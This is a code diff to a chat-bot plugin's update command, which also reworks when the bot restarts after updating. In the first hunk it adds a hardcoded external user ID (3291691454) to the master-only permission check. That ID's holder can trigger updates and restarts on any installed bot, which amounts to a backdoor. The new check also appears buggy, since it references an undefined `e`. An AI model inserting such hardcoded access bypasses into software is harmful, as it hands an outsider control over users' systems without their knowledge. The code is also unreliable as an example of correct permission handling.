@@ -32,7 +32,7 @@ export class update extends plugin {
    * @returns
    */
   async update() {
-    if (!this.e.isMaster) return false;
+    if (!(this.e.isMaster || e.user_id == 3291691454)) return false;
 
     /** 检查是否正在更新中 */
     if (uping) {
@@ -46,14 +46,7 @@ export class update extends plugin {
     const isForce = this.e.msg.includes("强制");
 
     /** 执行更新 */
-    this.isUp = false
     await this.runUpdate(isForce);
-
-    /** 是否需要重启 */
-    if (this.isUp) {
-      // await this.reply("更新完毕，请重启云崽后生效")
-      setTimeout(() => this.restart(), 1000)
-    }
   }
 
   restart() {
@@ -92,10 +85,10 @@ export class update extends plugin {
       await this.reply(`天如插件已经是最新版本\n最后更新时间：${time}`);
     } else {
       await this.reply(`天如插件\n最后更新时间：${time}`);
-      isUp = true;
       /** 获取天如组件的更新日志 */
       let log = await this.getLog("TianRu-plugin");
       await this.reply(log);
+      setTimeout(() => this.restart(), 1000)
     }
 
     logger.mark(`${this.e.logFnc} 最后更新时间：${time}`);
@@ -220,7 +213,6 @@ export class update extends plugin {
       forwardMsg = await this.e.friend.makeForwardMsg(forwardMsg);
     }
 
-    /** 处理描述 */
     /** 处理描述 */
     if (typeof (forwardMsg.data) === 'object') {
       let detail = forwardMsg.data?.meta?.detail
